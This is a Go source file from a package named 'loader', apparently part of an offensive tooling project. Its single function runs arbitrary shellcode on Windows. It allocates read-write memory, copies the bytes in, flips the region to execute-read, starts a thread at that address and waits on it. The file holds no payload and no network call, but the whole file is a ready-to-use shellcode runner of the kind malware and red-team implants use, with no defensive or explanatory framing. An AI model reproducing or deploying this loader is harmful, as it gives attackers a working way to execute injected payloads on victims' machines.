package loader

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func CreateThread(shellcode []byte) error {
	addr, vaErr := xwindows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %v", vaErr)
	}

	rcErr := xwindows.RtlCopyMemory(
		unsafe.Pointer(addr),
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
	)
	if rcErr != nil {
		return fmt.Errorf("RtlCopyMemory failed: %v", rcErr)
	}

	var oldProtect uint32
	_, vpErr := xwindows.VirtualProtect(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if vpErr != nil {
		return fmt.Errorf("VirtualProtect failed: %v", vpErr)
	}

	thread, ctErr := xwindows.CreateThread(
		0,
		0,
		addr,
		uintptr(0),
		0,
		0,
	)
	if ctErr != nil {
		return fmt.Errorf("CreateThread failed: %v", ctErr)
	}

	_, wsErr := xwindows.WaitForSingleObject(
		thread,
		windows.INFINITE,
	)
	if wsErr != nil {
		return fmt.Errorf("WaitForSingleObject failed: %v", wsErr)
	}

	return nil
}
